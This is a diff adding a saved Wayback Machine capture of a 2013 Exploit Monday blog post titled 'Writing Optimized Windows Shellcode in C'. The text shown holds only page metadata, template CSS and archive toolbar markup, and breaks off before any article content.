@@ -1,0 +1,2636 @@
+<!DOCTYPE html>
+<!-- saved from url=(0126)https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2013/08/writing-optimized-windows-shellcode-in-c.html -->
+<html class="v2" dir="ltr" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><script src="./Writing Optimized Windows Shellcode in C_files/cb=gapi.loaded_1" async=""></script><script src="./Writing Optimized Windows Shellcode in C_files/cb=gapi.loaded_0" async=""></script><script src="./Writing Optimized Windows Shellcode in C_files/analytics.js.download" type="text/javascript"></script>
+<script type="text/javascript">window.addEventListener('DOMContentLoaded',function(){var v=archive_analytics.values;v.service='wb';v.server_name='wwwb-app209.us.archive.org';v.server_ms=359;archive_analytics.send_pageview({});});</script>
+<script type="text/javascript" src="./Writing Optimized Windows Shellcode in C_files/bundle-playback.js.download" charset="utf-8"></script>
+<script type="text/javascript" src="./Writing Optimized Windows Shellcode in C_files/wombat.js.download" charset="utf-8"></script>
+<script type="text/javascript">
+  __wm.init("https://web.archive.org/web");
+  __wm.wombat("http://www.exploit-monday.com/2013/08/writing-optimized-windows-shellcode-in-c.html","20210305190309","https://web.archive.org/","web","/_static/",
+	      "1614970989");
+</script>
+<link rel="stylesheet" type="text/css" href="./Writing Optimized Windows Shellcode in C_files/banner-styles.css">
+<link rel="stylesheet" type="text/css" href="./Writing Optimized Windows Shellcode in C_files/iconochive.css">
+<!-- End Wayback Rewrite JS Include -->
+
+<link href="./Writing Optimized Windows Shellcode in C_files/3416767676-css_bundle_v2.css" rel="stylesheet" type="text/css">
+<meta content="width=1100" name="viewport">
+
+<meta content="blogger" name="generator">
+<link href="https://web.archive.org/web/20210305190309im_/http://www.exploit-monday.com/favicon.ico" rel="icon" type="image/x-icon">
+<link href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2013/08/writing-optimized-windows-shellcode-in-c.html" rel="canonical">
+<link rel="alternate" type="application/atom+xml" title="Exploit Monday - Atom" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/feeds/posts/default">
+<link rel="alternate" type="application/rss+xml" title="Exploit Monday - RSS" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/feeds/posts/default?alt=rss">
+<link rel="service.post" type="application/atom+xml" title="Exploit Monday - Atom" href="https://www.blogger.com/feeds/6052198192158185644/posts/default">
+
+<link rel="alternate" type="application/atom+xml" title="Exploit Monday - Atom" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/feeds/299909111219502438/comments/default">
+<!--[if IE]><script type="text/javascript" src="https://www.blogger.com/static/v1/jsbin/1277698886-ieretrofit.js"></script>
+<![endif]-->
+<link href="./Writing Optimized Windows Shellcode in C_files/x64_Optimized.png" rel="image_src">
+<meta content="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2013/08/writing-optimized-windows-shellcode-in-c.html" property="og:url">
+<meta content="Writing Optimized Windows Shellcode in C" property="og:title">
+<meta content="Download: PIC_Bindshell   Introduction   I’ll be the first to admit: writing shellcode sucks. While you have the advantage of employing some..." property="og:description">
+<meta content="https://web.archive.org/web/20210305190309im_/http://3.bp.blogspot.com/-eEf1AMNqI4o/Ug6uHDAdU7I/AAAAAAAAAOY/gvcS7DibrMA/w1200-h630-p-k-no-nu/x64_Optimized.png" property="og:image">
+<!--[if IE]> <script> (function() { var html5 = ("abbr,article,aside,audio,canvas,datalist,details," + "figure,footer,header,hgroup,mark,menu,meter,nav,output," + "progress,section,time,video").split(','); for (var i = 0; i < html5.length; i++) { document.createElement(html5[i]); } try { document.execCommand('BackgroundImageCache', false, true); } catch(e) {} })(); </script> <![endif]-->
+<title>Exploit Monday: Writing Optimized Windows Shellcode in C</title>
+<style type="text/css">@font-face{font-family:'Permanent Marker';font-style:normal;font-weight:400;src:url(//web.archive.org/web/20210305190309im_/http://fonts.gstatic.com/s/permanentmarker/v10/Fh4uPib9Iyv2ucM6pGQMWimMp004La2Ceg.ttf)format('truetype');}</style>
+<style id="page-skin-1" type="text/css"><!--
+/*-----------------------------------------------
+Blogger Template Style
+Name:     Picture Window
+Designer: Blogger
+URL:      www.blogger.com
+----------------------------------------------- */
+/* Content
+----------------------------------------------- */
+body {
+font: normal normal 15px Arial, Tahoma, Helvetica, FreeSans, sans-serif;
+color: #333333;
+background: #3cbcfc url(https://web.archive.org/web/20210305190309im_/http://1.bp.blogspot.com/-7jgnjiPOjkE/Ug-o1qZNA8I/AAAAAAAAAPI/uuTw5R7jfKA/s0/background2.png) repeat-x fixed bottom center;
+}
+html body .region-inner {
+min-width: 0;
+max-width: 100%;
+width: auto;
+}
+.content-outer {
+font-size: 90%;
+}
+a:link {
+text-decoration:none;
+color: #336699;
+}
+a:visited {
+text-decoration:none;
+color: #6699cc;
+}
+a:hover {
+text-decoration:underline;
+color: #33aaff;
+}
+.content-outer {
+background: transparent none repeat scroll top left;
+-moz-border-radius: 0;
+-webkit-border-radius: 0;
+-goog-ms-border-radius: 0;
+border-radius: 0;
+-moz-box-shadow: 0 0 0 rgba(0, 0, 0, .15);
+-webkit-box-shadow: 0 0 0 rgba(0, 0, 0, .15);
+-goog-ms-box-shadow: 0 0 0 rgba(0, 0, 0, .15);
+box-shadow: 0 0 0 rgba(0, 0, 0, .15);
+margin: 20px auto;
+}
+.content-inner {
+padding: 0;
+}
+/* Header
+----------------------------------------------- */
+.header-outer {
+background: transparent none repeat-x scroll top left;
+_background-image: none;
+color: #0080c0;
+-moz-border-radius: 0;
+-webkit-border-radius: 0;
+-goog-ms-border-radius: 0;
+border-radius: 0;
+}
+.Header img, .Header #header-inner {
+-moz-border-radius: 0;
+-webkit-border-radius: 0;
+-goog-ms-border-radius: 0;
+border-radius: 0;
+}
+.header-inner .Header .titlewrapper,
+.header-inner .Header .descriptionwrapper {
+padding-left: 0;
+padding-right: 0;
+}
+.Header h1 {
+font: normal normal 50px Permanent Marker;
+text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.3);
+}
+.Header h1 a {
+color: #0080c0;
+}
+.Header .description {
+font-size: 130%;
+}
+/* Tabs
+----------------------------------------------- */
+.tabs-inner {
+margin: .5em 20px 0;
+padding: 0;
+}
+.tabs-inner .section {
+margin: 0;
+}
+.tabs-inner .widget ul {
+padding: 0;
+background: transparent none repeat scroll bottom;
+-moz-border-radius: 0;
+-webkit-border-radius: 0;
+-goog-ms-border-radius: 0;
+border-radius: 0;
+}
+.tabs-inner .widget li {
+border: none;
+}
+.tabs-inner .widget li a {
+display: inline-block;
+padding: .5em 1em;
+margin-right: .25em;
+color: #ffffff;
+font: normal normal 15px Arial, Tahoma, Helvetica, FreeSans, sans-serif;
+-moz-border-radius: 10px 10px 0 0;
+-webkit-border-top-left-radius: 10px;
+-webkit-border-top-right-radius: 10px;
+-goog-ms-border-radius: 10px 10px 0 0;
+border-radius: 10px 10px 0 0;
+background: transparent url(https://web.archive.org/web/20210305190309im_/https://resources.blogblog.com/blogblog/data/1kt/transparent/black50.png) repeat scroll top left;
+border-right: 1px solid transparent;
+}
+.tabs-inner .widget li:first-child a {
+padding-left: 1.25em;
+-moz-border-radius-topleft: 10px;
+-moz-border-radius-bottomleft: 0;
+-webkit-border-top-left-radius: 10px;
+-webkit-border-bottom-left-radius: 0;
+-goog-ms-border-top-left-radius: 10px;
+-goog-ms-border-bottom-left-radius: 0;
+border-top-left-radius: 10px;
+border-bottom-left-radius: 0;
+}
+.tabs-inner .widget li.selected a,
+.tabs-inner .widget li a:hover {
+position: relative;
+z-index: 1;
+background: transparent url(https://web.archive.org/web/20210305190309im_/https://resources.blogblog.com/blogblog/data/1kt/transparent/white80.png) repeat scroll bottom;
+color: #336699;
+-moz-box-shadow: 0 0 3px rgba(0, 0, 0, .15);
+-webkit-box-shadow: 0 0 3px rgba(0, 0, 0, .15);
+-goog-ms-box-shadow: 0 0 3px rgba(0, 0, 0, .15);
+box-shadow: 0 0 3px rgba(0, 0, 0, .15);
+}
+/* Headings
+----------------------------------------------- */
+h2 {
+font: bold normal 13px Arial, Tahoma, Helvetica, FreeSans, sans-serif;
+text-transform: uppercase;
+color: #888888;
+margin: .5em 0;
+}
+/* Main
+----------------------------------------------- */
+.main-outer {
+background: transparent url(https://web.archive.org/web/20210305190309im_/https://resources.blogblog.com/blogblog/data/1kt/transparent/white80.png) repeat scroll top left;
+-moz-border-radius: 20px 20px 0 0;
+-webkit-border-top-left-radius: 20px;
+-webkit-border-top-right-radius: 20px;
+-webkit-border-bottom-left-radius: 0;
+-webkit-border-bottom-right-radius: 0;
+-goog-ms-border-radius: 20px 20px 0 0;
+border-radius: 20px 20px 0 0;
+-moz-box-shadow: 0 1px 3px rgba(0, 0, 0, .15);
+-webkit-box-shadow: 0 1px 3px rgba(0, 0, 0, .15);
+-goog-ms-box-shadow: 0 1px 3px rgba(0, 0, 0, .15);
+box-shadow: 0 1px 3px rgba(0, 0, 0, .15);
+}
+.main-inner {
+padding: 15px 20px 20px;
+}
+.main-inner .column-center-inner {
+padding: 0 0;
+}
+.main-inner .column-left-inner {
+padding-left: 0;
+}
+.main-inner .column-right-inner {
+padding-right: 0;
+}
+/* Posts
+----------------------------------------------- */
+h3.post-title {
+margin: 0;
+font: normal normal 18px Arial, Tahoma, Helvetica, FreeSans, sans-serif;
+}
+.comments h4 {
+margin: 1em 0 0;
+font: normal normal 18px Arial, Tahoma, Helvetica, FreeSans, sans-serif;
+}
+.date-header span {
+color: #333333;
+}
+.post-outer {
+background-color: #ffffff;
+border: solid 1px #dddddd;
+-moz-border-radius: 5px;
+-webkit-border-radius: 5px;
+border-radius: 5px;
+-goog-ms-border-radius: 5px;
+padding: 15px 20px;
+margin: 0 -20px 20px;
+}
+.post-body {
+line-height: 1.4;
+font-size: 110%;
+position: relative;
+}
+.post-header {
+margin: 0 0 1.5em;
+color: #999999;
+line-height: 1.6;
+}
+.post-footer {
+margin: .5em 0 0;
+color: #999999;
+line-height: 1.6;
+}
+#blog-pager {
+font-size: 140%
+}
+#comments .comment-author {
+padding-top: 1.5em;
+border-top: dashed 1px #ccc;
+border-top: dashed 1px rgba(128, 128, 128, .5);
+background-position: 0 1.5em;
+}
+#comments .comment-author:first-child {
+padding-top: 0;
+border-top: none;
+}
+.avatar-image-container {
+margin: .2em 0 0;
+}
+/* Comments
+----------------------------------------------- */
+.comments .comments-content .icon.blog-author {
+background-repeat: no-repeat;
+background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABIAAAASCAYAAABWzo5XAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEgAACxIB0t1+/AAAAAd0SU1FB9sLFwMeCjjhcOMAAAD+SURBVDjLtZSvTgNBEIe/WRRnm3U8RC1neQdsm1zSBIU9VVF1FkUguQQsD9ITmD7ECZIJSE4OZo9stoVjC/zc7ky+zH9hXwVwDpTAWWLrgS3QAe8AZgaAJI5zYAmc8r0G4AHYHQKVwII8PZrZFsBFkeRCABYiMh9BRUhnSkPTNCtVXYXURi1FpBDgArj8QU1eVXUzfnjv7yP7kwu1mYrkWlU33vs1QNu2qU8pwN0UpKoqokjWwCztrMuBhEhmh8bD5UDqur75asbcX0BGUB9/HAMB+r32hznJgXy2v0sGLBcyAJ1EK3LFcbo1s91JeLwAbwGYu7TP/3ZGfnXYPgAVNngtqatUNgAAAABJRU5ErkJggg==);
+}
+.comments .comments-content .loadmore a {
+border-top: 1px solid #33aaff;
+border-bottom: 1px solid #33aaff;
+}
+.comments .continue {
+border-top: 2px solid #33aaff;
+}
+/* Widgets
+----------------------------------------------- */
+.widget ul, .widget #ArchiveList ul.flat {
+padding: 0;
+list-style: none;
+}
+.widget ul li, .widget #ArchiveList ul.flat li {
+border-top: dashed 1px #ccc;
+border-top: dashed 1px rgba(128, 128, 128, .5);
+}
+.widget ul li:first-child, .widget #ArchiveList ul.flat li:first-child {
+border-top: none;
+}
+.widget .post-body ul {
+list-style: disc;
+}
+.widget .post-body ul li {
+border: none;
+}
+/* Footer
+----------------------------------------------- */
+.footer-outer {
+color:#cccccc;
+background: transparent url(https://web.archive.org/web/20210305190309im_/https://resources.blogblog.com/blogblog/data/1kt/transparent/black50.png) repeat scroll top left;
+-moz-border-radius: 0 0 20px 20px;
+-webkit-border-top-left-radius: 0;
+-webkit-border-top-right-radius: 0;
+-webkit-border-bottom-left-radius: 20px;
+-webkit-border-bottom-right-radius: 20px;
+-goog-ms-border-radius: 0 0 20px 20px;
+border-radius: 0 0 20px 20px;
+-moz-box-shadow: 0 1px 3px rgba(0, 0, 0, .15);
+-webkit-box-shadow: 0 1px 3px rgba(0, 0, 0, .15);
+-goog-ms-box-shadow: 0 1px 3px rgba(0, 0, 0, .15);
+box-shadow: 0 1px 3px rgba(0, 0, 0, .15);
+}
+.footer-inner {
+padding: 10px 20px 20px;
+}
+.footer-outer a {
+color: #99ccee;
+}
+.footer-outer a:visited {
+color: #77aaee;
+}
+.footer-outer a:hover {
+color: #33aaff;
+}
+.footer-outer .widget h2 {
+color: #aaaaaa;
+}
+/* Mobile
+----------------------------------------------- */
+html body.mobile {
+height: auto;
+}
+html body.mobile {
+min-height: 480px;
+background-size: 100% auto;
+}
+.mobile .body-fauxcolumn-outer {
+background: transparent none repeat scroll top left;
+}
+html .mobile .mobile-date-outer, html .mobile .blog-pager {
+border-bottom: none;
+background: transparent url(https://web.archive.org/web/20210305190309im_/https://resources.blogblog.com/blogblog/data/1kt/transparent/white80.png) repeat scroll top left;
+margin-bottom: 10px;
+}
+.mobile .date-outer {
+background: transparent url(https://web.archive.org/web/20210305190309im_/https://resources.blogblog.com/blogblog/data/1kt/transparent/white80.png) repeat scroll top left;
+}
+.mobile .header-outer, .mobile .main-outer,
+.mobile .post-outer, .mobile .footer-outer {
+-moz-border-radius: 0;
+-webkit-border-radius: 0;
+-goog-ms-border-radius: 0;
+border-radius: 0;
+}
+.mobile .content-outer,
+.mobile .main-outer,
+.mobile .post-outer {
+background: inherit;
+border: none;
+}
+.mobile .content-outer {
+font-size: 100%;
+}
+.mobile-link-button {
+background-color: #336699;
+}
+.mobile-link-button a:link, .mobile-link-button a:visited {
+color: #ffffff;
+}
+.mobile-index-contents {
+color: #333333;
+}
+.mobile .tabs-inner .PageList .widget-content {
+background: transparent url(https://web.archive.org/web/20210305190309im_/https://resources.blogblog.com/blogblog/data/1kt/transparent/white80.png) repeat scroll bottom;
+color: #336699;
+}
+.mobile .tabs-inner .PageList .widget-content .pagelist-arrow {
+border-left: 1px solid transparent;
+}
+.post-body textarea {
+background-color: transparent;
+border: 1px solid #222222;
+border-radius: 5px;
+-moz-border-radius: 5px;
+-webkit-border-radius: 5px;
+-khtml-border-radius: 5px;
+resize: vertical;
+overflow: automatic;
+padding: 5px;
+width: 98%;
+font-family: 'Courier New', Courier, monospace;
+font-size: inherit;
+text-align: left;
+position: inherit;
+}
+--></style>
+<style id="template-skin-1" type="text/css"><!--
+body {
+min-width: 1180px;
+}
+.content-outer, .content-fauxcolumn-outer, .region-inner {
+min-width: 1180px;
+max-width: 1180px;
+_width: 1180px;
+}
+.main-inner .columns {
+padding-left: 0px;
+padding-right: 300px;
+}
+.main-inner .fauxcolumn-center-outer {
+left: 0px;
+right: 300px;
+/* IE6 does not respect left and right together */
+_width: expression(this.parentNode.offsetWidth -
+parseInt("0px") -
+parseInt("300px") + 'px');
+}
+.main-inner .fauxcolumn-left-outer {
+width: 0px;
+}
+.main-inner .fauxcolumn-right-outer {
+width: 300px;
+}
+.main-inner .column-left-outer {
+width: 0px;
+right: 100%;
+margin-left: -0px;
+}
+.main-inner .column-right-outer {
+width: 300px;
+margin-right: -300px;
+}
+#layout {
+min-width: 0;
+}
+#layout .content-outer {
+min-width: 0;
+width: 800px;
+}
+#layout .region-inner {
+min-width: 0;
+width: auto;
+}
+body#layout div.add_widget {
+padding: 8px;
+}
+body#layout div.add_widget a {
+margin-left: 32px;
+}
+--></style>
+<style>
+    body {background-image:url(/web/20210305190309im_/http://www.exploit-monday.com/2013/08/http\:\/\/1.bp.blogspot.com\/-7jgnjiPOjkE\/Ug-o1qZNA8I\/AAAAAAAAAPI\/uuTw5R7jfKA\/s0\/background2.png);}
+    
+@media (max-width: 200px) { body {background-image:url(/web/20210305190309im_/http://www.exploit-monday.com/2013/08/http\:\/\/1.bp.blogspot.com\/-7jgnjiPOjkE\/Ug-o1qZNA8I\/AAAAAAAAAPI\/uuTw5R7jfKA\/w200\/background2.png);}}
+@media (max-width: 400px) and (min-width: 201px) { body {background-image:url(/web/20210305190309im_/http://www.exploit-monday.com/2013/08/http\:\/\/1.bp.blogspot.com\/-7jgnjiPOjkE\/Ug-o1qZNA8I\/AAAAAAAAAPI\/uuTw5R7jfKA\/w400\/background2.png);}}
+@media (max-width: 800px) and (min-width: 401px) { body {background-image:url(/web/20210305190309im_/http://www.exploit-monday.com/2013/08/http\:\/\/1.bp.blogspot.com\/-7jgnjiPOjkE\/Ug-o1qZNA8I\/AAAAAAAAAPI\/uuTw5R7jfKA\/w800\/background2.png);}}
+@media (max-width: 1200px) and (min-width: 801px) { body {background-image:url(/web/20210305190309im_/http://www.exploit-monday.com/2013/08/http\:\/\/1.bp.blogspot.com\/-7jgnjiPOjkE\/Ug-o1qZNA8I\/AAAAAAAAAPI\/uuTw5R7jfKA\/w1200\/background2.png);}}
+/* Last tag covers anything over one higher than the previous max-size cap. */
+@media (min-width: 1201px) { body {background-image:url(/web/20210305190309im_/http://www.exploit-monday.com/2013/08/http\:\/\/1.bp.blogspot.com\/-7jgnjiPOjkE\/Ug-o1qZNA8I\/AAAAAAAAAPI\/uuTw5R7jfKA\/w1600\/background2.png);}}
+  </style>
+<link href="./Writing Optimized Windows Shellcode in C_files/authorization.css" media="all" onload="if(media!=&#39;all&#39;)media=&#39;all&#39;" rel="stylesheet"><noscript><link href="https://web.archive.org/web/20210305190309cs_/https://www.blogger.com/dyn-css/authorization.css?targetBlogID=6052198192158185644&amp;zx=3394f609-d28f-4687-918a-50ba43c39a58" rel="stylesheet"/></noscript>
+
+<script type="text/javascript" src="./Writing Optimized Windows Shellcode in C_files/f.txt"></script><style>.gc-bubbleDefault{table-layout:auto!important}.gc-bubbleDefault,.gc-reset{background-color:transparent!important;text-align:left;padding:0!important;margin:0!important;border:0!important}.pls-bubbleTop{border-bottom:1px solid #ccc!important}.pls-contentLeft,.pls-topTail,.pls-vertShimLeft{background-image:url(https://web.archive.org/web/20210305190309///ssl.gstatic.com/s2/oz/images/stars/po/bubblev1/border_3.gif)!important}.pls-topTail{background-repeat:repeat-x!important;background-position:bottom!important}.pls-vertShim{background-color:#fff!important;text-align:right}.tbl-grey .pls-vertShim{background-color:#f5f5f5!important}.pls-vertShimLeft{background-repeat:repeat-y!important;background-position:100%!important;height:4px}.pls-vertShimRight{height:4px}.pls-confirm-container .pls-vertShim{background-color:#fff3c2!important}.pls-contentWrap{background-color:#fff!important;position:relative!important;vertical-align:top}.pls-contentLeft{background-repeat:repeat-y;background-position:100%;vertical-align:top}.pls-dropRight{background-image:url(https://web.archive.org/web/20210305190309///ssl.gstatic.com/s2/oz/images/stars/po/bubblev1/bubbleDropR_3.png)!important;background-repeat:repeat-y!important}.pls-dropBL,.pls-dropBottom,.pls-dropRight,.pls-dropTR .pls-dropBR,.pls-tailleft,.pls-vert,.pls-vert img{vertical-align:top}.pls-dropBottom{background-image:url(https://web.archive.org/web/20210305190309///ssl.gstatic.com/s2/oz/images/stars/po/bubblev1/bubbleDropB_3.png)!important;background-repeat:repeat-x!important;width:100%}.pls-topLeft{text-align:right}.pls-topLeft,.pls-topRight{background:inherit!important;vertical-align:bottom}.pls-topRight{text-align:left}.pls-bottomLeft{background:inherit!important;text-align:right}.pls-bottomRight{background:inherit!important;text-align:left;vertical-align:top}.pls-tailbottom,.pls-tailleft,.pls-tailright,.pls-tailtop{display:none;position:relative}.pls-dropBL,.pls-dropBR,.pls-dropTR,.pls-tailbottom,.pls-tailleft,.pls-tailright,.pls-tailtop{background-image:url(https://web.archive.org/web/20210305190309///ssl.gstatic.com/s2/oz/images/stars/po/bubblev1/bubbleSprite_3.png)!important;background-repeat:no-repeat}.tbl-grey .pls-dropBL,.tbl-grey .pls-dropBR,.tbl-grey .pls-dropTR,.tbl-grey .pls-tailbottom,.tbl-grey .pls-tailleft,.tbl-grey .pls-tailright,.tbl-grey .pls-tailtop{background-image:url(https://web.archive.org/web/20210305190309///ssl.gstatic.com/s2/oz/images/stars/po/bubblev1/bubbleSprite-grey.png)!important}.pls-tailbottom{background-position:-23px 0}.pls-confirm-container .pls-tailbottom{background-position:-23px -10px}.pls-tailtop{background-position:-19px -20px}.pls-tailright{background-position:0 0}.pls-tailleft{background-position:-10px 0}.pls-tailtop{vertical-align:top}.gc-bubbleDefault td{line-height:0;font-size:0}.pls-tailbottom,.pls-topLeft img,.pls-topRight img{vertical-align:bottom}.bubbleDropTR,.pls-bottomLeft,.pls-bottomLeft img,.pls-dropBottom img,.pls-dropBottomL img,.pls-dropBottomR img{vertical-align:top}.pls-dropTR{background-position:0 -22px}.pls-dropBR{background-position:0 -27px}.pls-dropBL{background-position:0 -16px}.pls-spacerbottom,.pls-spacerleft,.pls-spacerright,.pls-spacertop{position:static!important}.pls-spinner{bottom:0;position:absolute;left:0;margin:auto;right:0;top:0}</style></head>
+<body class=" variant-open"><!-- BEGIN WAYBACK TOOLBAR INSERT -->
+<script>__wm.rw(0);</script>
+<div id="wm-ipp-base" lang="en" style="display: block; direction: ltr; height: 1px;"><template shadowrootmode="closed"><div id="wm-ipp" style="position:fixed;left:0;top:0;right:0;" class="">
+<div id="donato" style="position: relative; width: 100%; height: 0px; visibility: hidden;">
+  <div id="donato-base" style="height: 80px;">
+    <iframe id="donato-if" src="https://archive.org/includes/donate.php?as_page=1&amp;platform=wb&amp;referer=https%3A//web.archive.org/web/20210305190309/http%3A//www.exploit-monday.com/2013/08/writing-optimized-windows-shellcode-in-c.html" scrolling="no" frameborder="0" style="width:100%; height:100%">
+    </iframe>
+  </div>
+</div><div id="wm-ipp-inside" style="display: none;">
+  <div id="wm-toolbar" style="position:relative;display:flex;flex-flow:row nowrap;justify-content:space-between;">
+    <div id="wm-logo" style="/*width:110px;*/padding-top:12px;">
+      <a href="https://web.archive.org/web/" title="Wayback Machine home page"><img src="https://web.archive.org/_static/images/toolbar/wayback-toolbar-logo-200.png" srcset="/_static/images/toolbar/wayback-toolbar-logo-100.png, /_static/images/toolbar/wayback-toolbar-logo-150.png 1.5x, /_static/images/toolbar/wayback-toolbar-logo-200.png 2x" alt="Wayback Machine" style="width:100px" border="0"></a>
+    </div>
+    <div class="c" style="display:flex;flex-flow:column nowrap;justify-content:space-between;flex:1;">
+      <form class="u" style="display:flex;flex-direction:row;flex-wrap:nowrap;" target="_top" method="get" action="https://web.archive.org/web/submit" name="wmtb" id="wmtb"><input type="text" name="url" id="wmtbURL" value="http://www.exploit-monday.com/2013/08/writing-optimized-windows-shellcode-in-c.html" onfocus="this.focus();this.select();" style="flex:1;" autocomplete="off"><input type="hidden" name="type" value="replay"><input type="hidden" name="date" value="20210305190309"><input type="submit" value="Go">
+      </form>
+      <div style="display:flex;flex-flow:row nowrap;align-items:flex-end;">
+                <div class="s" id="wm-nav-captures" style="flex:1;"><a class="t" href="https://web.archive.org/web/*/http://www.exploit-monday.com/2013/08/writing-optimized-windows-shellcode-in-c.html" title="See a list of every capture for this URL">85 captures</a><div class="r" title="Timespan for captures of this URL">20 Aug 2013 - 15 Mar 2023</div></div>
+        <div class="k">
+          <a href="https://web.archive.org/web/20091201000000/http://www.exploit-monday.com/2013/08/writing-optimized-windows-shellcode-in-c.html" id="wm-graph-anchor">
+            <div id="wm-ipp-sparkline" title="Explore captures for this URL" style="position: relative">
+              <canvas id="wm-sparkline-canvas" width="700" height="27" border="0"></canvas>
+            <div class="yt" style="display: none; width: 25px; height: 27px; left: 325px;"></div><div class="mt" style="display: none; width: 2px; height: 27px; left: 348px;"></div></div>
+          </a>
+        </div>
+      </div>
+    </div>
+    <div class="n">
+      <table>
+        <tbody>
+          <!-- NEXT/PREV MONTH NAV AND MONTH INDICATOR -->
+          <tr class="m">
+            <td class="b" nowrap="nowrap"><a href="https://web.archive.org/web/20201202085848/http://www.exploit-monday.com/2013/08/writing-optimized-windows-shellcode-in-c.html" title="02 Dec 2020"><strong>Dec</strong></a></td>
+            <td class="c" id="displayMonthEl" title="You are here: 19:03:09 Mar 05, 2021">Mar</td>
+            <td class="f" nowrap="nowrap"><a href="https://web.archive.org/web/20220508003808/http://www.exploit-monday.com/2013/08/writing-optimized-windows-shellcode-in-c.html" title="08 May 2022"><strong>May</strong></a></td>
+          </tr>
+          <!-- NEXT/PREV CAPTURE NAV AND DAY OF MONTH INDICATOR -->
+          <tr class="d">
+            <td class="b" nowrap="nowrap"><a href="https://web.archive.org/web/20201202085848/http://www.exploit-monday.com/2013/08/writing-optimized-windows-shellcode-in-c.html" title="08:58:48 Dec 02, 2020"><img src="https://web.archive.org/_static/images/toolbar/wm_tb_prv_on.png" alt="Previous capture" width="14" height="16" border="0"></a></td>
+            <td class="c" id="displayDayEl" style="width:34px;font-size:22px;white-space:nowrap;" title="You are here: 19:03:09 Mar 05, 2021">05</td>
+            <td class="f" nowrap="nowrap"><a href="https://web.archive.org/web/20220508003808/http://www.exploit-monday.com/2013/08/writing-optimized-windows-shellcode-in-c.html" title="00:38:08 May 08, 2022"><img src="https://web.archive.org/_static/images/toolbar/wm_tb_nxt_on.png" alt="Next capture" width="14" height="16" border="0"></a></td>
+          </tr>
+          <!-- NEXT/PREV YEAR NAV AND YEAR INDICATOR -->
+          <tr class="y">
+            <td class="b" nowrap="nowrap"><a href="https://web.archive.org/web/20200220175745/http://www.exploit-monday.com:80/2013/08/writing-optimized-windows-shellcode-in-c.html" title="20 Feb 2020"><strong>2020</strong></a></td>
+            <td class="c" id="displayYearEl" title="You are here: 19:03:09 Mar 05, 2021">2021</td>
+            <td class="f" nowrap="nowrap"><a href="https://web.archive.org/web/20220508003808/http://www.exploit-monday.com/2013/08/writing-optimized-windows-shellcode-in-c.html" title="08 May 2022"><strong>2022</strong></a></td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+    <div class="r" style="display:flex;flex-flow:column nowrap;align-items:flex-end;justify-content:space-between;">
+      <div id="wm-btns" style="text-align:right;height:23px;">
+                <span class="xxs">
+          <div id="wm-save-snapshot-success">success</div>
+          <div id="wm-save-snapshot-fail">fail</div>
+          <a id="wm-save-snapshot-open" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2013/08/writing-optimized-windows-shellcode-in-c.html#" title="Share via My Web Archive" style="display: none;">
+            <span class="iconochive-web"></span>
+          </a>
+          <a href="https://archive.org/account/login.php" title="Sign In" id="wm-sign-in" style="display: inline-block;">
+            <span class="iconochive-person"></span>
+          </a>
+          <span id="wm-save-snapshot-in-progress" class="iconochive-web" style="display: none;"></span>
+        </span>
+                <a class="xxs" href="http://faq.web.archive.org/" title="Get some help using the Wayback Machine" style="top:-6px;"><span class="iconochive-question" style="color:rgb(87,186,244);font-size:160%;"></span></a>
+        <a id="wm-tb-close" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2013/08/writing-optimized-windows-shellcode-in-c.html#close" style="top:-2px;" title="Close the toolbar"><span class="iconochive-remove-circle" style="color:#888888;font-size:240%;"></span></a>
+      </div>
+      <div id="wm-share" class="xxs">
+        <a href="https://web.archive.org/web/20210305190309/http://web.archive.org/screenshot/http://www.exploit-monday.com/2013/08/writing-optimized-windows-shellcode-in-c.html" id="wm-screenshot" title="screenshot" style="visibility: hidden;">
+          <span class="wm-icon-screen-shot"></span>
+        </a>
+        <a href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2013/08/writing-optimized-windows-shellcode-in-c.html#" id="wm-video" title="video">
+          <span class="iconochive-movies"></span>
+        </a>
+        <a id="wm-share-facebook" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2013/08/writing-optimized-windows-shellcode-in-c.html#" data-url="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2013/08/writing-optimized-windows-shellcode-in-c.html" title="Share on Facebook" style="margin-right:5px;" target="_blank"><span class="iconochive-facebook" style="color:#3b5998;font-size:160%;"></span></a>
+        <a id="wm-share-twitter" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2013/08/writing-optimized-windows-shellcode-in-c.html#" data-url="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2013/08/writing-optimized-windows-shellcode-in-c.html" title="Share on Twitter" style="margin-right:5px;" target="_blank"><span class="iconochive-twitter" style="color:#1dcaff;font-size:160%;"></span></a>
+      </div>
+      <div style="padding-right:2px;text-align:right;white-space:nowrap;">
+        <a id="wm-expand" class="wm-btn wm-closed" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2013/08/writing-optimized-windows-shellcode-in-c.html#expand" onclick="__wm.ex(event);return false;"><span id="wm-expand-icon" class="iconochive-down-solid"></span> <span class="xxs" style="font-size:80%;">About this capture</span></a>
+      </div>
+    </div>
+  </div>
+    <div id="wm-capinfo" style="border-top:1px solid #777;display:none; overflow: hidden">
+        <div id="wm-capinfo-notice" source="api"></div>
+                <div id="wm-capinfo-collected-by">
+    <div style="background-color:#666;color:#fff;font-weight:bold;text-align:center">COLLECTED BY</div>
+    <div style="padding:3px;position:relative" id="wm-collected-by-content">
+      <div style="display:inline-block;vertical-align:top;width:49%;">
+			<span class="c-logo" style="background-image:url(https://archive.org/services/img/commoncrawl)"></span>
+		<div>Collection: <a style="color:#33f;" href="https://archive.org/details/commoncrawl" target="_new"><span class="wm-title">Common Crawl</span></a></div>
+		<div style="max-height:75px;overflow:hidden;position:relative;">
